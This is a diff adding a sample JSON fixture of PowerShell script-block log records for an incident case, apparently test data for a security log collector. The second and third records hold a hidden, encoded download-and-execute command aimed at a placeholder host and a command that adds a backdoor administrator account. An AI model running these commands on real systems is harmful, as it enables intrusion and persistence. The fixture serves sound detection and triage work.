@@ -1,0 +1,49 @@
+{
+  "schema_version": "1.0",
+  "case_id": "INC-001",
+  "device": "WIN-PC-01",
+  "source": "powershell",
+  "collected_at": "2026-10-08T08:10:00Z",
+  "collector": {
+    "name": "sentinel-windows-collector",
+    "version": "0.1.0-sample"
+  },
+  "records": [
+    {
+      "record_id": "PS-0001",
+      "timestamp": "2026-10-08T07:15:03Z",
+      "user": "svc_backup",
+      "pid": 3920,
+      "event_id": 4104,
+      "origin": "script_block_log",
+      "log": "Microsoft-Windows-PowerShell/Operational",
+      "script_path": "C:\\IT\\Scripts\\disk-report.ps1",
+      "host_application": "powershell.exe -NoProfile -File C:\\IT\\Scripts\\disk-report.ps1",
+      "command": "Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free | Export-Csv C:\\IT\\Reports\\disk-report.csv -NoTypeInformation"
+    },
+    {
+      "record_id": "PS-0002",
+      "timestamp": "2026-10-08T07:34:02Z",
+      "user": "ahmed",
+      "pid": 6012,
+      "event_id": 4104,
+      "origin": "script_block_log",
+      "log": "Microsoft-Windows-PowerShell/Operational",
+      "script_path": null,
+      "host_application": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JAB1AD0AJwBoAHQAdABwAHMAOgAvAC8AZgBpAGwAZQBzAC0AcwB5AG4AYwAuAGUAeABhAG0AcABsAGUALgBuAGUAdAAvAHMAdABhAGcAZQAvAHUAcABkAGEAdABlAF8AcwB2AGMALgBwAHMAMQAnADsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAdQBwAGQAYQB0AGUAXwBzAHYAYwAuAHAAcwAxADsAcABvAHcAZQByAHMAaABlAGwAbAAgAC0ARgBpAGwAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAdQBwAGQAYQB0AGUAXwBzAHYAYwAuAHAAcwAxAA==",
+      "command": "$u='https://files-sync.example.net/stage/update_svc.ps1';Invoke-WebRequest -Uri $u -OutFile C:\\Users\\Public\\update_svc.ps1;powershell -File C:\\Users\\Public\\update_svc.ps1"
+    },
+    {
+      "record_id": "PS-0003",
+      "timestamp": "2026-10-08T07:34:45Z",
+      "user": "ahmed",
+      "pid": 6188,
+      "event_id": 4104,
+      "origin": "script_block_log",
+      "log": "Microsoft-Windows-PowerShell/Operational",
+      "script_path": "C:\\Users\\Public\\update_svc.ps1",
+      "host_application": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\update_svc.ps1",
+      "command": "net user svc_helpdesk [REDACTED] /add; net localgroup Administrators svc_helpdesk /add"
+    }
+  ]
+}
